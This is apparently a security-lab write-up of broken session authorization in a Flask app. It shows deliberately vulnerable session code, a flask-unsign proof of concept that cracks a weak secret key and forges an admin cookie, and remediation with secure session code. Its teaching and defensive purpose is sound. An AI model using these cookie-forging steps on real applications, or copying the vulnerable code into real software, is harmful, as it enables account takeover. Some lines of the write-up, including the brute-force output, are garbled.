## Access Control Vulnerability ( Broken Session Authorization ) - Level_02

### **Overview**

The application stores the authenticated user identity (`user_id`, `username`, `role`, `email`, `session_token`) inside a Flask Session, and `/home` route authorizes request solely reading `session['user_id']` from that cookie, and the `session_token`  embedded in it is a plain `ase64url(json.dumps(payload))`  with no signature. Attacker can sign an arbitrary session payload and impersonate any user including admin by changing just `user_id`.

### **Vulnerable code**

#### Session management - unsigned token + identity duplicated into cookie

```python
@staticmethod
def _create_session(user):
    payload = {
        "user_id": user.id,
        "username": user.username,
        "email": user.email,
        "role": user.role,
        "exp": (datetime.utcnow() + timedelta(minutes=5)).isoformat()
    }

    # ⚠️ No signature, no encryption — just base64url(JSON)
    token = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode()

    # ⚠️ Identity written into the client-side (signed-but-forgeable) cookie
    session['session_token'] = token
    session['user_id'] = user.id
    session['username'] = user.username
    session['email'] = user.email
    session['role'] = user.role

    db_session = DBSession(user_id=user.id, session_token=token)
    db.session.add(db_session)
    db.session.commit()
```

#### Login route - plaintext password comparison, no session rotation

```python
@access_control_bp.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        user = User.query.filter_by(username=username).first()
        if user and user.password == password: # ⚠️ plaintext compare
            SessionManager._create_session(user) #  ⚠️ no session.clear()/rotation
            flash("Logged in successfully!", "success")
            return redirect(url_for('access_control.home'))
        else:
            flash("Invalid credentials", "error")
            return redirect(url_for('access_control.login'))

    return render_template("form.html")
```

#### Home route - authorization trusts the cookie's `user_id`

```python
@access_control_bp.route('/home')
def home():
    user_id = session.get('user_id')                 # ⚠️ attacker-controlled
    if not user_id:
        return redirect(url_for('access_control.login'))

    target_id = request.args.get('id', type=int, default=user_id)
    if target_id != user_id:                         # check shape is right...
        flash("You are not authorized to view this content.", "error")
        return redirect(url_for('access_control.home'))

    target_user = db.session.get(User, target_id)    # ...but user_id is forgeable
    return render_template("content.html", target_user=target_user)
```

### **POC**

```bash
flask-unsign --unsign --cookie '.eJw9j1FrgzAUhf9Lnsdo4-pDYTDRDRKWPAxtTV-KSUNNek2G0Vk39t8XW9jbud-5HM75QbprDKAtUk0PPrzIXk9Bq0fwqgH0gHoPOrpj0H28gg7BeHcc_EW7iPVM1wrv5hrDhVh_ZmY6E7f7PtR0FPs1LIx0vFXd9UvNJJCcgty_fcqcpFFbUdMgE54JR-GUcBDzJkjM2-gvv7PE13vGLZOY9zwzh7qdbsySiVkxsDIbmP2oWFmlrHhNWUlGXlRPrGAJcavnWHtpfzQntMV37ZpO_09Gv3-bSlma.atzHDA.PPnUouUNa8e8_Ldv1IYBSk6p7wU' --wordlist docs/access_control_lab/wordlists.txt
```

```bash
[*] Session decodes to: {'email': 'carlos@brewsec.local', 'role': 'user', 'session_token': 'eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImNhcmxvcyIsICJlbWFpbCI6ICJjYXJsb3NAYnJld3NlYy5sb2NhbCIsICJyb2xlIjogInVzZXIiLCAiZXhwIjogIjIwMjYtMTAtMjRUMTU6MDE6MTIuNDU4MDM3In0=', 'user_id': 2, 'username': 'carlos'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 128 attempts4UIN7xPOKJx7
'JY7d4ZQ5p4aQ5LotwJVRorBDEiK2m6MptM1Ffb'
```

- then attacker forges a session as admin

```bash
flask-unsign --sign --cookie "{'user_id': 1}" --secret 'JY7d4ZQ5p4aQ5LotwJVRorBDEiK2m6MptM1Ffb'
```

- then replace the browser's `session` cookie and reload the page.

### **Impact**

1. **Vertical privilege escalation:** any authenticated user becomes administrator by setting `user_id` to the admin's primary key (typically `1`).
2. **Horizontal account takeover:** enumerate `user_id` 1…N to view every user's profile/content, leaking PII (username, email, role).
3. **No authentication required beyond a self-registered account** (or a captured cookie).
4. **Root cause is systemic:** identity is client-controlled, the token is unsigned, and the `SECRET_KEY` is weak — three independent failures that each alone would be sufficient.

### **Remediation**

1. **Never trust client-supplied identity for authorization.** The cookie must carry only an **opaque, random session identifier**; the identity (`user_id`, `role`, `is_active`) must be resolved **server-side from the database on every request**.
2. **Sign any token that must be stateless** — use `itsdangerous.URLSafeTimedSerializer` (or a real JWT with `HS256`/`RS256`) and **enforce `max_age`**. Remove the `base64url(json)` token entirely; it provides no integrity.
3. **Rotate the session on login** (`session.clear()` / new `sid`) to prevent fixation; **revoke on logout** (`revoked_at`) and **purge expired** rows.
4. **Harden the `SECRET_KEY`:** ≥32 random bytes from a secret manager, never in source/`.env`/git, rotated on compromise. Set `SESSION_COOKIE_HTTPONLY=True`, `SECURE=True`, `SAMESITE='Lax'`, `DEBUG=False` in production.
5. **Add authorization logging** for denied object-level checks to detect enumeration.

### **Secure session creation**:

```python
import hashlib, secrets
from datetime import datetime, timedelta

class ServerSession(db.Model):
    id         = db.Column(db.Integer, primary_key=True)
    sid_hash   = db.Column(db.String(64), unique=True, nullable=False, index=True)
    user_id    = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    expires_at = db.Column(db.DateTime, nullable=False)
    revoked_at = db.Column(db.DateTime, nullable=True)
    ip         = db.Column(db.String(45))
    ua         = db.Column(db.String(255))
```

```python
SESSION_TTL = timedelta(hours=8)

def create_session(user, response):
    raw_sid = secrets.token_urlsafe(32)                      # unguessable, no claims
    db.session.add(ServerSession(
        sid_hash   = hashlib.sha256(raw_sid.encode()).hexdigest(),
        user_id    = user.id,
        expires_at = datetime.utcnow() + SESSION_TTL,
        ip         = request.remote_addr,
        ua         = request.user_agent.string[:255],
    ))
    db.session.commit()
    response.set_cookie('sid', raw_sid, httponly=True, secure=True,
                        samesite='Lax', max_age=int(SESSION_TTL.total_seconds()))
    return response
```
